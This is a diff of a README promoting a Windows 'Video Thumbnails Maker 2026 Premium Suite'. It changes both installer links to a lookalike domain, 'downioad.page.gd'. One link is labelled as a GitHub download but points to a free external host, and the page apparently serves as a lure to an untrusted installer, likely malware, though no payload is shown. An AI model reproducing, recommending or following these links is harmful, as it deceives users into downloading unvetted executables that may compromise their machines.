@@ -2,7 +2,7 @@
 
 Welcome to the Video Thumbnails Maker 2026 Premium Suite, a comprehensive tool designed to enhance your video thumbnail creation process. This suite offers advanced features for generating professional-quality thumbnails on Windows, perfect for content creators and video enthusiasts. With the latest updates in 2026, it provides improved performance, new customization options, and a seamless user experience for all your thumbnail needs.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## System Requirements
 
@@ -74,7 +74,7 @@ A: The tool supports most common formats like MP4, AVI, MKV, and MOV. If you enc
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 Last Updated: 2026
 
